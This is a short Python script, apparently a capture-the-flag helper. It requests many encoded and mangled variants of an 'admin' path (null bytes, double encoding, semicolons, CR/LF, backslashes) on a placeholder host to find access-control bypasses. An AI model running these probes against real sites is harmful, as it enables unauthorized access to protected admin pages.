import urllib.request, urllib.error
BASE='https://<host>/unauth/'
paths=['admin','admin/','Admin/','ADMIN/','administrator','administrator/','xadmin','adminx','foo/admin','foo/admin/','notadmin','myadmin','admin%2f','admin%00','admin%20','admin.','admin..','admin;','admin%3b','%61dmin/','%2561dmin/','adm%69n/','a%64min/','ad%6din/','admin%2e/','admin%2e%2e/','admin/.','admin/./','admin//','//admin/','///admin/','admin\\','admin%5c','admin%09','admin%0a','admin%0d','panel','panel/','flag','flag/','getflag','login','logout','home','index','settings','config','dashboard','private','secret','internal']
for p in paths:
    url=BASE+p
    r=urllib.request.Request(url, headers={'User-Agent':'Mozilla/5.0'})
    try:
        resp=urllib.request.urlopen(r, timeout=8); body=resp.read(); code=resp.status; loc=resp.headers.get('Location','')
    except urllib.error.HTTPError as e:
        body=e.read(); code=e.code; loc=e.headers.get('Location','')
    except Exception as e:
        print('ERR',p,e); continue
    print('%3d %4d %-22s %s'%(code,len(body),p,(loc or body[:40]).replace('\n',' ')))
